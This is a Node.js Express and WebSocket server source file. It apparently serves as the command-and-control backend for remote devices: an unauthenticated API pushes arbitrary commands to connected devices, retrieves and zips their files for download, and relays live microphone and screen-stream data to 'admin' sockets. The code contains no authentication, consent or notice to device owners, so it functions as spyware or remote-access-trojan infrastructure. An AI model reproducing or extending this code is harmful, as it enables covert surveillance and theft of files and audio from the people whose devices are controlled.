
const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const path = require('path');
const socketRegistry = require('./services/socketRegistry');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use((err, req, res, next) => {
    if (err instanceof SyntaxError && err.status === 400 && 'body' in err) {
        console.error('Bad JSON:', err.message);
        return res.status(400).send({ error: 'Invalid JSON payload' });
    }
    next();
});
app.use(express.static(path.join(__dirname, 'public')));

// Admin API
app.get('/api/devices', (req, res) => {
    res.json(socketRegistry.getAllClients());
});

app.get('/api/devices/:id', (req, res) => {
    const client = socketRegistry.getClient(req.params.id);
    if (client) {
        res.json({ deviceId: req.params.id, ...client.info });
    } else {
        res.status(404).json({ error: 'Device not found' });
    }
});

app.get('/api/devices/:id/files', (req, res) => {
    const client = socketRegistry.getClient(req.params.id);
    if (client && client.fileContext) {
        res.json(client.fileContext);
    } else {
        res.json({ status: 'pending', files: [] }); // Empty state if no data yet
    }
});

app.get('/api/devices/:id/zip', (req, res) => {
    const client = socketRegistry.getClient(req.params.id);
    if (client && client.zipContext) {
        res.json(client.zipContext);
    } else {
        res.json({ status: 'pending' });
    }
});

app.get('/api/devices/:id/files/download', (req, res) => {
    const client = socketRegistry.getClient(req.params.id);
    if (client && client.downloadContext && client.downloadContext.status === 'success') {
        const fileData = client.downloadContext;
        const buffer = Buffer.from(fileData.data, 'base64');
        const filename = path.basename(fileData.path);

        res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
        res.setHeader('Content-Type', 'application/octet-stream');
        res.send(buffer);
    } else {
        res.status(404).send('File not ready or failed to download');
    }
});

app.post('/api/command', (req, res) => {
    const { deviceId, action, payload } = req.body;
    const client = socketRegistry.getClient(deviceId);

    if (!client || client.ws.readyState !== WebSocket.OPEN) {
        return res.status(404).json({ error: 'Device not found or offline' });
    }

    const command = {
        id: `cmd_${Date.now()}`,
        action,
        payload
    };

    client.ws.send(JSON.stringify(command));
    res.json({ status: 'sent', commandId: command.id });
});

// WebSocket Handling
wss.on('connection', (ws) => {
    process.on('uncaughtException', (err) => {
        console.error('Uncaught Exception:', err);
    });

    ws.on('error', (error) => {
        console.error('WebSocket Error:', error);
        socketRegistry.remove(ws);
    });

    // console.log('[WSS] New connection'); // Too noisy?

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);

            if (data.type === 'handshake') {
                const { deviceId, ...info } = data;
                socketRegistry.register(ws, deviceId, info);
            } else if (data.type === 'admin_handshake') {
                ws.isAdmin = true;
                console.log('[WSS] Admin connected');
            } else if (data.action === 'mic_data' || data.action === 'stream_data') {
                // Relay to all admins
                let sentCount = 0;
                wss.clients.forEach(client => {
                    if (client.isAdmin && client.readyState === WebSocket.OPEN) {
                        client.send(JSON.stringify(data));
                        sentCount++;
                    }
                });
                // Log every 100th packet to avoid spam but confirm flow
                if (Math.random() < 0.01) console.log(`[${data.action}] Relayed packet to ${sentCount} admins`);
            } else if (data.replyTo) {
                console.log(`[Response] ${data.replyTo}:`, data);

                if (data.action === 'device_info_response') {
                    // Update registry with new info
                    const { action, replyTo, ...info } = data;
                    // We need the deviceId. Since we don't have it in the message (unless we add it), 
                    // we can look it up from the ws connection if we reverse map, 
                    // but the registry uses deviceId as key.
                    // Wait, socketRegistry.register takes (ws, deviceId, info).
                    // We need to find the deviceId associated with this ws.
                    // socketRegistry doesn't expose a reverse lookup easily, but let's check.
                    // Actually, we can just iterate or maybe add a deviceId prop to ws.

                    // EASIER FIX: Let's assume the client sends deviceId in response? 
                    // No, it doesn't currently.
                    // Let's modify socketRegistry to allow updating by WS, or just iterate.

                    // Iterate clients to find the one matching `ws`
                    for (const [id, client] of socketRegistry.clients.entries()) {
                        if (client.ws === ws) {
                            socketRegistry.register(ws, id, { ...client.info, ...info });
                            console.log(`[Registry] Updated info for ${id}`);
                            break;
                        }
                    }
                } else if (data.action === 'files_read_response') {
                    const { action, replyTo, ...fileData } = data;
                    // Store download context
                    for (const [id, client] of socketRegistry.clients.entries()) {
                        if (client.ws === ws) {
                            client.downloadContext = fileData;
                            console.log(`[Registry] Ready for download from ${id}`);
                            break;
                        }
                    }
                } else if (data.action === 'files_zip_response') {
                    const { action, replyTo, ...zipData } = data;
                    // Store zip context
                    for (const [id, client] of socketRegistry.clients.entries()) {
                        if (client.ws === ws) {
                            client.zipContext = zipData;
                            console.log(`[Registry] Zip ready for ${id}:`, zipData);
                            break;
                        }
                    }
                } else if (data.action === 'files_list_response') {
                    const { action, replyTo, ...fileData } = data;
                    // Store file context in the registry
                    for (const [id, client] of socketRegistry.clients.entries()) {
                        if (client.ws === ws) {
                            client.fileContext = fileData;
                            console.log(`[Registry] Updated file context for ${id}`);
                            break;
                        }
                    }
                }
            }
        } catch (e) {
            console.error('Failed to parse message:', e.message);
        }
    });

    ws.on('close', () => {
        socketRegistry.remove(ws);
    });
});

server.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
});
